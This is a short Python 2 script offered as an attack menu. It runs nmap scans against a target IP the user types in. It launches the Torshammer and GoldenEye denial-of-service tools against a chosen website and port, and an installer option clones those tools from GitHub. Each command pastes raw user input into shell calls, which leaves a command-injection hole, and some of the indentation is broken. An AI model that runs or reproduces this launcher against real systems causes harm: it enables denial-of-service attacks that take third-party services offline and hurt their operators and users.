
import subprocess
import socket

def cal(cmd):
	subprocess.call(cmd, shell=True)
cal("clear")
print ("USE NUMBER KEY TO SELECT OPTION")
print ("")
print ("1 = NMAP")
print ("2 = DDOS")
print ("3 = DOWNLOAD SCRIPTS")
print ("")
choice = raw_input("[root@main]#")

if choice == '1':
	print ("QUICK SCAN = 1")
	print ("INTENSE SCAN = 2")
	print ("QUICK SCAN + UDP = 3")
	print ("SCAN ALL TCP PORTS = 4")

	choice = raw_input("[root@nmap]#")
       	if choice == '1':
	 ip = raw_input("Enter IP You Want To Scan: ")
	 ot = raw_input("Enter OutPut File: ")
	 cal("nmap -A "+ ip +" -o "+ ot +"")

	if choice == '2':
	 ip = raw_input("Enter IP You Want to Scan: ")
	 ot = raw_input("Enter Output File Name: ")
	 cal("nmap -T4 -A -v "+ ip +" && nmap -T4 -A -v "+ ip +" -o "+ ot +"")

	if choice == '3':
	 ip = raw_input("Enter IP You Want to Scan: ")
	 ot = raw_input("Enter Output File Name: ")
	 cal("nmap -sU -A -T4 "+ ip +" -o "+ ot +"")

	if choice == '4':
	 ip = raw_input("Enter IP You Want to Scan: ")
	 ot = raw_input("Enter Output File Name: ")
	 cal("nmap -p 1-65535 -T4 -A "+ ip +" -o "+ ot +"")

if choice == '2':
  	print ("")
	print ("Torshammer = 1")
  	print ("GoldenEye = 2")
 	print ("")
	choice = raw_input("[root@ddos]#")
 	if choice == '1':
		ip = raw_input("Enter IP/Website: ")
		pt = raw_input("Enter Port: ")

		cal("cd files/torshammer && python torshammer.py -t "+ ip +" -p "+ pt +"")

 	if choice == '2':
		ip = raw_input("Enter Website URL: ")
		cal("cd files/GoldenEye && python goldeneye.py "+ ip +"")

if choice == '3':
 print("Are You Using Centos or Debian?")
 print("If Centos, Enter [1]")
 print("If Debian, Enter [2]")
 print("")
 choice = raw_input("[root@admin]#")
 if choice == '1':
  print("DOWNLOADING SCRIPTS!")
 
  cal("yum update")
  cal("yum install nmap")
  cal("yum install git")
  cal("mkdir files")
  cal("pip install sockets")
  cal("cd files && git clone https://github.com/dotfighter/torshammer")
  cal("cd files && git clone https://github.com/jseidl/GoldenEye")
 
  print ("ALL FILES INSTALLED AND READY TO GO!")
 if choice == '2':
  print("DOWNLOADING SCRIPTS!")
  
  cal("apt-get update")
  cal("apt-get install nmap")
  cal("apt-get install git")
  cal("mkdir files")
  cal("pip install sockets")
  cal("cd files && git clone https://github.com/dotfighter/torshammer")
  cal("cd files && git clone https://github.com/jseidl/GoldenEye")
  
  print("ALL FILES INSTALLED AND READY TO GO!")
